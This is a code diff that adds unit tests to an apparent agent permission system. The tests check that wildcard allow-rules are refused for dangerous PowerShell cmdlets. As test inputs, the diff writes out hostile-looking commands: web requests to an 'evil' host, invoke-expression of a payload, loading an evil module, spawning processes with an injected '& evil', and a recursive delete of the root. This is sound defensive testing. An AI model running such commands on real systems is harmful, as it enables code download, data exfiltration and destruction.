@@ -63,6 +63,35 @@ test('suggestAllowPrefix prefers two-word, applies bare-root + NEVER_SUGGEST gua
   assert.equal(suggestAllowPrefix('ls -la'), 'ls');
 });
 
+test('suggestAllowPrefix refuses dangerous PowerShell cmdlets as wildcard prefixes', () => {
+  // Lowercase single-cmdlet invocations: the first-word is a NEVER_SUGGEST
+  // cmdlet → refuse (degrade to allow-once instead of an `invoke-webrequest*`
+  // rule that would auto-allow all future exfil). These forms are NOT already
+  // guarded by BARE_SHELL_PREFIXES, so they discriminate the fix.
+  assert.equal(suggestAllowPrefix('iwr http://evil/x -outfile y'), null);
+  assert.equal(suggestAllowPrefix('invoke-webrequest -uri http://evil/x'), null);
+  assert.equal(suggestAllowPrefix('invoke-expression $payload'), null);
+  assert.equal(suggestAllowPrefix('import-module ./evil.psm1'), null);
+  assert.equal(suggestAllowPrefix('invoke-wmimethod -class win32_process -name create'), null);
+  assert.equal(suggestAllowPrefix('new-object system.net.webclient'), null);
+  // Two-word prefix whose ROOT is a dangerous spawner must also be refused —
+  // `start-process notepad*` would match `start-process notepad.exe & evil`.
+  assert.equal(suggestAllowPrefix('start-process notepad'), null);
+  // Arg-gated cmdlet: a `foreach-object*` rule would auto-allow
+  // `foreach-object { remove-item -recurse / }`.
+  assert.equal(suggestAllowPrefix('foreach-object { remove-item x }'), null);
+  // Read-only PS cmdlets are NOT in the set → still get a first-word prefix.
+  assert.equal(suggestAllowPrefix('get-childitem -path .'), 'get-childitem');
+});
+
+test('getFirstWordPrefix refuses dangerous PowerShell cmdlets', () => {
+  assert.equal(getFirstWordPrefix('iwr -uri http://x'), null);
+  assert.equal(getFirstWordPrefix('invoke-expression $x'), null);
+  assert.equal(getFirstWordPrefix('new-object system.net.webclient'), null);
+  // A benign (lowercase) PS cmdlet is unaffected.
+  assert.equal(getFirstWordPrefix('get-content file.txt'), 'get-content');
+});
+
 test('normalizeToolName canonicalizes legacy/cross-framework names', () => {
   assert.equal(normalizeToolName('Bash'), 'bash');
   assert.equal(normalizeToolName('Edit'), 'file_edit');
